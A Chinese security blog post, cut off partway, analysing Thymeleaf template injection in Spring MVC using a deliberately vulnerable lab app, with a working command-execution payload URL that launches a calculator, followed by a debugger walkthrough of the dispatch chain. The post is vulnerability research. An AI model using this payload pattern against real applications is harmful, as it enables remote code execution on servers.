@@ -1,0 +1,2239 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='近期在审计XX管理系统时，挖到了一个 Thymeleaf 模板注入，借此机会分析一下此类漏洞产生的原理。 0x00 前置知识 引用 Thymeleaf SSTI 分析以及最新版修复的 Bypass ${...}：V'>
+<title>Thymeleaf模板注入原理分析</title>
+
+<link rel='canonical' href='/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Thymeleaf模板注入原理分析'>
+<meta property='og:description' content='近期在审计XX管理系统时，挖到了一个 Thymeleaf 模板注入，借此机会分析一下此类漏洞产生的原理。 0x00 前置知识 引用 Thymeleaf SSTI 分析以及最新版修复的 Bypass ${...}：V'>
+<meta property='og:url' content='/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/'>
+<meta property='og:site_name' content='0ZHan&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Java安全' /><meta property='article:published_time' content='2024-03-26T00:04:27&#43;08:00'/><meta property='article:modified_time' content='2024-03-26T00:04:27&#43;08:00'/>
+<meta name="twitter:title" content="Thymeleaf模板注入原理分析">
+<meta name="twitter:description" content="近期在审计XX管理系统时，挖到了一个 Thymeleaf 模板注入，借此机会分析一下此类漏洞产生的原理。 0x00 前置知识 引用 Thymeleaf SSTI 分析以及最新版修复的 Bypass ${...}：V">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-G42YH9J7M8"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-G42YH9J7M8', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/1000_huac81c2698ed7f4f7ac0962c570fafca4_51159_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">0ZHan&#39;s Blog</a></h1>
+            <h2 class="site-description">才须学也</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href=''
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href=''
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/tags/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11 3L20 12a1.5 1.5 0 0 1 0 2L14 20a1.5 1.5 0 0 1 -2 0L3 11v-4a4 4 0 0 1 4 -4h4" />
+  <circle cx="9" cy="9" r="2" />
+</svg>
+
+
+
+                
+                <span>标签</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>暗色模式</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li>
+      <ol>
+        <li><a href="#0x00-前置知识">0x00 前置知识</a></li>
+        <li><a href="#0x01-环境配置">0x01 环境配置</a></li>
+        <li><a href="#0x02-原理分析">0x02 原理分析</a></li>
+        <li><a href="#0x03-thymeleaf-ssti-修复方案分析">0x03 Thymeleaf SSTI 修复方案分析</a>
+          <ol>
+            <li></li>
+          </ol>
+        </li>
+        <li><a href="#0x04-高版本-bypass">0x04 高版本 Bypass</a>
+          <ol>
+            <li><a href="#thymeleaf-30x">Thymeleaf 3.0.x</a></li>
+            <li><a href="#thymeleaf-31x">Thymeleaf 3.1.x</a></li>
+          </ol>
+        </li>
+        <li><a href="#0x06-reference">0x06 Reference</a></li>
+      </ol>
+    </li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">Thymeleaf模板注入原理分析</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Mar 26, 2024</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 10 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>近期在审计XX管理系统时，挖到了一个 Thymeleaf 模板注入，借此机会分析一下此类漏洞产生的原理。</p>
+<h3 id="0x00-前置知识">0x00 前置知识</h3>
+<p>引用 <a class="link" href="https://cloud.tencent.com/developer/article/2204466"  target="_blank" rel="noopener"
+    >Thymeleaf SSTI 分析以及最新版修复的 Bypass</a></p>
+<blockquote>
+<ul>
+<li>
+<p><code>${...}</code>：Variable Expressions（变量表达式）——通常在实际应用，一般是OGNL表达式或者是 SpEL，在Spring框架下使用SpEL表达式</p>
+</li>
+<li>
+<p><code>*{...}</code>：Selection Variable Expressions （选择表达式）——类似于变量表达式，区别在于选择表达式是在当前选择的对象而不是整个上下文变量映射上执行。</p>
+</li>
+<li>
+<p><code>#{...}</code>：Message Expressions（消息表达式）——允许从外部源（比如<code>.properties</code>文件）检索特定于语言环境的消息</p>
+</li>
+<li>
+<p><code>@{...}</code>：Link URL Expressions（URL链接表达式）——允许许从外部源（比如<code>.properties</code>文件）检索特定于语言环境的消息</p>
+</li>
+<li>
+<p><code>~{...}</code>：Fragment Expressions（片段表达式）<strong>Thymeleaf 3.x 版本新增的内容</strong>，分段段表达式是一种表示标记片段并将其移动到模板周围的简单方法。 正是由于这些表达式，片段可以被复制，或者作为参数传递给其他模板等等</p>
+</li>
+</ul>
+</blockquote>
+<p><strong>内联表达式 Expression inlining</strong></p>
+<blockquote>
+<p><a class="link" href="https://www.thymeleaf.org/doc/tutorials/3.1/usingthymeleaf.html"  target="_blank" rel="noopener"
+    >Thymeleaf 3.1x 官方文档</a></p>
+<p>尽管标准语法允许我们使用标签属性执行几乎所有操作，但在某些情况下我们可能更喜欢将表达式直接写入 HTML 文本。例如，我们可能更喜欢这样写：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#e06c75">p</span>&gt;Hello, [[${session.user.name}]]!&lt;/<span style="color:#e06c75">p</span>&gt;
+</span></span></code></pre></div><p>…而不是这个：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#e06c75">p</span>&gt;Hello, &lt;<span style="color:#e06c75">span</span> <span style="color:#e06c75">th:text</span><span style="color:#56b6c2">=</span><span style="color:#98c379">&#34;${session.user.name}&#34;</span>&gt;Sebastian&lt;/<span style="color:#e06c75">span</span>&gt;!&lt;/<span style="color:#e06c75">p</span>&gt;
+</span></span></code></pre></div><p><code>[[...]]</code>或<code>[(...)]</code>在 Thymeleaf 中被视为<strong>内联表达式</strong>，我们可以使用任何在 <code>th:text</code> 或 <code>th:utext</code> 属性中也有效的表达式。</p>
+<p>请注意，<code>[[...]]</code> 对应于 <code>th:text</code>（即结果将进行 HTML 转义），而 <code>[(...)]</code> 对应于 <code>th:utext</code>，不会执行任何 HTML 转义。因此，对于变量 <code>msg = 'This is &lt;b&gt;great!&lt;/b&gt;'</code>，在给定这个片段的情况下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#e06c75">p</span>&gt;The message is &#34;[(${msg})]&#34;&lt;/<span style="color:#e06c75">p</span>&gt;
+</span></span></code></pre></div><p>结果将不会对那些<code>&lt;b&gt;</code>标签进行转义，因此：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#e06c75">p</span>&gt;The message is &#34;This is &lt;<span style="color:#e06c75">b</span>&gt;great!&lt;/<span style="color:#e06c75">b</span>&gt;&#34;&lt;/<span style="color:#e06c75">p</span>&gt;
+</span></span></code></pre></div><p>而如果像这样写：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#e06c75">p</span>&gt;The message is &#34;[[${msg}]]&#34;&lt;/<span style="color:#e06c75">p</span>&gt;
+</span></span></code></pre></div><p>结果则会被 HTML 转义：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#e06c75">p</span>&gt;The message is &#34;This is <span style="color:#e06c75">&amp;lt;</span>b<span style="color:#e06c75">&amp;gt;</span>great!<span style="color:#e06c75">&amp;lt;</span>/b<span style="color:#e06c75">&amp;gt;</span>&#34;&lt;/<span style="color:#e06c75">p</span>&gt;
+</span></span></code></pre></div><p>请注意 <strong>默认情况下</strong>，在我们标记的每个标签的<strong>正文部分</strong>中都启用了<strong>文本内联</strong>，而不是标签本身，因此我们<strong>无需</strong>执行任何操作来启用它</p>
+</blockquote>
+<h3 id="0x01-环境配置">0x01 环境配置</h3>
+<p>和网上大多数文章一样，实验环境选择了 <strong><a class="link" href="https://github.com/veracode-research/spring-view-manipulation"  target="_blank" rel="noopener"
+    >spring-view-manipulation</a></strong></p>
+<p>运行环境并访问如下地址</p>
+<pre tabindex="0"><code>http://127.0.0.1:8090/path?lang=__%24%7Bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&#34;calc&#34;).getInputStream()).next()%7D__%3A%3A.x
+</code></pre><p>弹出计算器~</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240318163042634.png"
+	width="1245"
+	height="680"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240318163042634_huc47265a6e08b787f54efe15227e26304_53757_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240318163042634_huc47265a6e08b787f54efe15227e26304_53757_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240318163042634"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="183"
+		data-flex-basis="439px"
+	
+></p>
+<h3 id="0x02-原理分析">0x02 原理分析</h3>
+<p><strong>SpringMVC 架构图</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/v2-64dcf5a18893722b22eb587d16572a35_720w.png"
+	width="2880"
+	height="1328"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/v2-64dcf5a18893722b22eb587d16572a35_720w_hu0191a65b5e2855ce7fe4a0267f03769f_1713685_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/v2-64dcf5a18893722b22eb587d16572a35_720w_hu0191a65b5e2855ce7fe4a0267f03769f_1713685_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="v2-64dcf5a18893722b22eb587d16572a35_720w"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="216"
+		data-flex-basis="520px"
+	
+></p>
+<p><strong>DispatcherServlet#doDispatch</strong></p>
+<p><code>DispatcherServlet</code> 负责全局的流程控制，必然参与到视图渲染流程，因此对 <code>doDispatch</code> 方法断点分析</p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306174940183.png"
+	width="1195"
+	height="550"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306174940183_hu670b85e32d73bf733a4ad26abbbe55c2_72000_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306174940183_hu670b85e32d73bf733a4ad26abbbe55c2_72000_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306174940183"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="217"
+		data-flex-basis="521px"
+	
+></p>
+<p><code>DispatcherServlet</code> 通过调用 <code>HandlerAdapter</code> （处理适配器），选择合适的 <code>Controller</code> 处理 <code>request</code>，跟进 <code>ha.hadle</code> 方法</p>
+<p><strong>AbstractHandlerMethodAdapter#handle</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306175228888.png"
+	width="1205"
+	height="246"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306175228888_hua8177efba4eb73d1b1e83f374b682243_35038_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306175228888_hua8177efba4eb73d1b1e83f374b682243_35038_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306175228888"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="489"
+		data-flex-basis="1175px"
+	
+></p>
+<p><strong>RequestMappingHandlerAdapter#handleInternal</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180318206.png"
+	width="1206"
+	height="377"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180318206_hu6a988cac4c0bee3d237676a592839076_55638_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180318206_hu6a988cac4c0bee3d237676a592839076_55638_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306180318206"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="319"
+		data-flex-basis="767px"
+	
+></p>
+<p><strong>RequestMappingHandlerAdapter#invokeHandlerMethod</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180427585.png"
+	width="1299"
+	height="553"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180427585_hu441549736db598eb97e3c69d7de1d03e_139930_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180427585_hu441549736db598eb97e3c69d7de1d03e_139930_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306180427585"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="234"
+		data-flex-basis="563px"
+	
+></p>
+<p><strong>ServletInvocableHandlerMethod#invokeAndHandle</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180521277.png"
+	width="1335"
+	height="502"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180521277_hude0786dff9827d6ac6daa68b0dcaefe1_96407_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306180521277_hude0786dff9827d6ac6daa68b0dcaefe1_96407_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306180521277"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="265"
+		data-flex-basis="638px"
+	
+></p>
+<p><code>returnValue</code> 即为 <code>Controller</code> 处理 <code>request</code> 返回的结果</p>
+<p><strong>InvocableHandlerMethod#invokeForRequest</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306190726481.png"
+	width="1191"
+	height="291"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306190726481_hu952320280bd97e2eb397f2959c45eafa_62563_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306190726481_hu952320280bd97e2eb397f2959c45eafa_62563_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306190726481"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="409"
+		data-flex-basis="982px"
+	
+></p>
+<p><strong>InvocableHandlerMethod#doInvoke</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306190814010.png"
+	width="1205"
+	height="373"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306190814010_hucef63e1e756a7567a61b2c56d01e5c86_60654_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306190814010_hucef63e1e756a7567a61b2c56d01e5c86_60654_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306190814010"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="323"
+		data-flex-basis="775px"
+	
+></p>
+<p>反射调用 <code>HelloController</code> 的 <code>path</code> 方法</p>
+<p><strong>HelloController#path</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191018305.png"
+	width="1325"
+	height="182"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191018305_hueac911948d20d529a67bf0436c87bfe0_41765_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191018305_hueac911948d20d529a67bf0436c87bfe0_41765_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306191018305"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="728"
+		data-flex-basis="1747px"
+	
+></p>
+<p>返回结果 <code>returnValue</code> 为 <code>user/__${T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;)}__::.x/welcome</code></p>
+<p><strong>ServletInvocableHandlerMethod#invokeAndHandle</strong></p>
+<p><img src="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191111139.png"
+	width="1316"
+	height="766"
+	srcset="/p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191111139_hue38c14159f179a4445e9b5a16654bf86_165405_480x0_resize_box_3.png 480w, /p/thymeleaf%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/img/image-20240306191111139_hue38c14159f179a4445e9b5a16654bf86_165405_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="image-20240306191111139"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="171"
+		data-flex-basis="412px"
+	
+></p>
